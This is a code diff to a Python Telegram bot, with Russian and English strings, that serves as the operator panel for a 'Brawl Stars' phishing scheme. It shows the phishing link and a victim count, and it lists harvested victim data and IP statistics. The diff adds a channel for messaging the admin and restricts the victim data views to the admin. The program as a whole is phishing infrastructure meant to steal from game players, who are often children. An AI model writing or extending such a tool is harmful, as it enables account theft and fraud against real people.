@@ -33,7 +33,11 @@ TEXTS = {
         'settings_btn': "⚙️ Настройки",
         'donate_25_btn': "⭐ 25⭐",
         'donate_50_btn': "⭐ 50⭐",
-        'donate_100_btn': "⭐ 100⭐"
+        'donate_100_btn': "⭐ 100⭐",
+        'new_message': "📩 **Новое сообщение от пользователя!**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Сообщение:\n`{text}`",
+        'reply_sent': "✅ Ответ отправлен пользователю!",
+        'reply_failed': "❌ Не удалось отправить ответ.",
+        'admin_help': "🔹 Просто напиши боту — сообщение придёт админу\n🔹 Админ ответит тебе кнопкой"
     },
     'en': {
         'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.",
@@ -53,7 +57,11 @@ TEXTS = {
         'settings_btn': "⚙️ Settings",
         'donate_25_btn': "⭐ 25⭐",
         'donate_50_btn': "⭐ 50⭐",
-        'donate_100_btn': "⭐ 100⭐"
+        'donate_100_btn': "⭐ 100⭐",
+        'new_message': "📩 **New message from user!**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Message:\n`{text}`",
+        'reply_sent': "✅ Reply sent to user!",
+        'reply_failed': "❌ Failed to send reply.",
+        'admin_help': "🔹 Just message the bot — it will be forwarded to admin\n🔹 Admin will reply to you with a button"
     }
 }
 
@@ -86,11 +94,17 @@ def answer_callback(callback_id, text="", show_alert=False):
     requests.post(url, json=data)
 
 def get_main_keyboard(chat_id):
-    return [
-        [{"text": get_button_text(chat_id, 'data_btn'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'stats_btn'), "callback_data": "stats"}],
-        [{"text": get_button_text(chat_id, 'donate_btn'), "callback_data": "donate_menu"}],
-        [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'settings_btn'), "callback_data": "settings"}]
-    ]
+    if chat_id == ADMIN_ID:
+        return [
+            [{"text": get_button_text(chat_id, 'data_btn'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'stats_btn'), "callback_data": "stats"}],
+            [{"text": get_button_text(chat_id, 'donate_btn'), "callback_data": "donate_menu"}],
+            [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'settings_btn'), "callback_data": "settings"}]
+        ]
+    else:
+        return [
+            [{"text": "📩 Написать админу", "callback_data": "contact_admin"}],
+            [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}]
+        ]
 
 def get_donate_keyboard(chat_id):
     return [
@@ -109,7 +123,18 @@ def get_language_keyboard():
         [{"text": "⬅️ Назад", "callback_data": "back"}]
     ]
 
-# === ВЕБ-СЕРВЕР ДЛЯ RENDER (чтобы порт был открыт) ===
+def get_reply_keyboard(user_id, username):
+    return [
+        [{"text": "✏️ Ответить пользователю", "callback_data": f"reply_{user_id}_{username}"}]
+    ]
+
+def get_reply_message_keyboard(reply_to_user_id, reply_to_username):
+    return [
+        [{"text": "📤 Отправить ответ", "callback_data": f"send_reply_{reply_to_user_id}"}],
+        [{"text": "❌ Отмена", "callback_data": "cancel_reply"}]
+    ]
+
+# === ВЕБ-СЕРВЕР ДЛЯ RENDER ===
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -126,6 +151,9 @@ threading.Thread(target=run_health_server, daemon=True).start()
 print("✅ Бот запущен на Render.com!")
 print(f"🔗 Ссылка: {PHISHING_URL}")
 
+# Временное хранилище для ответов администратора
+admin_reply_context = {}
+
 # === ОСНОВНОЙ ЦИКЛ БОТА ===
 while True:
     try:
@@ -137,28 +165,76 @@ while True:
             message = update.get("message", {})
             callback = update.get("callback_query", {})
 
+            # Обработка сообщений
             if message:
                 chat_id = message.get("chat", {}).get("id")
+                username = message.get("chat", {}).get("username", "нет")
                 text = message.get("text", "")
-                if chat_id != ADMIN_ID:
-                    send_message(chat_id, "❌ Доступ запрещён")
-                    continue
-                if text == "/start":
-                    user_language[chat_id] = 'ru'
-                    send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
+                
+                if chat_id == ADMIN_ID:
+                    # Администратор
+                    if text == "/start":
+                        user_language[chat_id] = 'ru'
+                        send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
+                    
+                    # Если админ находится в режиме ответа пользователю
+                    elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
+                        target_user_id = admin_reply_context[chat_id]["user_id"]
+                        target_username = admin_reply_context[chat_id]["username"]
+                        # Отправляем ответ пользователю
+                        send_message(target_user_id, f"📩 **Ответ от администратора:**\n\n{text}")
+                        send_message(chat_id, f"✅ Ответ отправлен пользователю @{target_username} (ID: {target_user_id})")
+                        admin_reply_context[chat_id] = {}
+                    
+                else:
+                    # Обычный пользователь
+                    if text == "/start":
+                        user_language[chat_id] = 'ru'
+                        send_message(chat_id, 
+                            f"🎉 **Добро пожаловать!** 🎉\n\n"
+                            f"🔹 Используй кнопки ниже для связи с администратором.\n"
+                            f"🔹 По всем вопросам пиши — ответят в ближайшее время.\n\n{get_text(chat_id, 'admin_help')}",
+                            get_main_keyboard(chat_id))
+                    else:
+                        # Пересылаем сообщение админу с кнопкой ответа
+                        forward_text = get_text(ADMIN_ID, 'new_message', user_id=chat_id, username=username, text=text)
+                        keyboard = get_reply_keyboard(chat_id, username)
+                        send_message(ADMIN_ID, forward_text, keyboard)
+                        send_message(chat_id, "✅ Ваше сообщение отправлено администратору. Ответ придёт сюда.")
 
+            # Обработка нажатий на кнопки
             if callback:
                 chat_id = callback.get("from", {}).get("id")
                 data = callback.get("data")
                 callback_id = callback.get("id")
                 message_id = callback.get("message", {}).get("message_id")
+                username = callback.get("from", {}).get("username", "нет")
+                message_text = callback.get("message", {}).get("text", "")
 
-                if chat_id != ADMIN_ID:
-                    answer_callback(callback_id, "❌ Доступ запрещён", True)
-                    continue
-
-                if data == "back":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
+                if data == "contact_admin":
+                    send_message(chat_id, "📩 **Напиши своё сообщение ниже**\n\nАдминистратор ответит в этот чат.")
+                    answer_callback(callback_id)
+                
+                elif data.startswith("reply_"):
+                    # Админ отвечает пользователю
+                    parts = data.split("_")
+                    if len(parts) >= 3:
+                        target_user_id = int(parts[1])
+                        target_username = parts[2]
+                        admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": target_user_id, "username": target_username}
+                        send_message(chat_id, f"✏️ **Ответ пользователю @{target_username}**\n\nНапиши текст ответа ниже:")
+                        answer_callback(callback_id)
+                
+                elif data == "cancel_reply":
+                    if chat_id in admin_reply_context:
+                        admin_reply_context[chat_id] = {}
+                    send_message(chat_id, "❌ Отправка ответа отменена.")
+                    answer_callback(callback_id)
+                
+                elif data == "back":
+                    edit_message(chat_id, message_id, 
+                        get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)) if chat_id == ADMIN_ID else get_text(chat_id, 'admin_help'),
+                        get_main_keyboard(chat_id))
                     answer_callback(callback_id)
 
                 elif data == "donate_menu":
@@ -183,7 +259,7 @@ while True:
                     edit_message(chat_id, message_id, get_text(chat_id, 'lang_changed_en'), get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
-                elif data == "data":
+                elif data == "data" and chat_id == ADMIN_ID:
                     if not victims:
                         edit_message(chat_id, message_id, get_text(chat_id, 'data_empty'), get_back_keyboard(chat_id))
                     else:
@@ -196,9 +272,18 @@ while True:
                         edit_message(chat_id, message_id, txt, get_back_keyboard(chat_id))
                     answer_callback(callback_id)
 
-                elif data == "stats":
+                elif data == "stats" and chat_id == ADMIN_ID:
                     unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
-                    edit_message(chat_id, message_id, get_text(chat_id, 'stats', total=len(victims), unique=unique_ips), get_back_keyboard(chat_id))
+                    edit_message(chat_id, message_id, 
+                        get_text(chat_id, 'stats', total=len(victims), unique=unique_ips),
+                        get_back_keyboard(chat_id))
+                    answer_callback(callback_id)
+
+                elif data == "donate_menu":
+                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
+                    answer_callback(callback_id)
+
+                else:
                     answer_callback(callback_id)
 
         time.sleep(1)
@@ -206,3 +291,4 @@ while True:
     except Exception as e:
         print(f"Ошибка: {e}")
         time.sleep(5)
+        
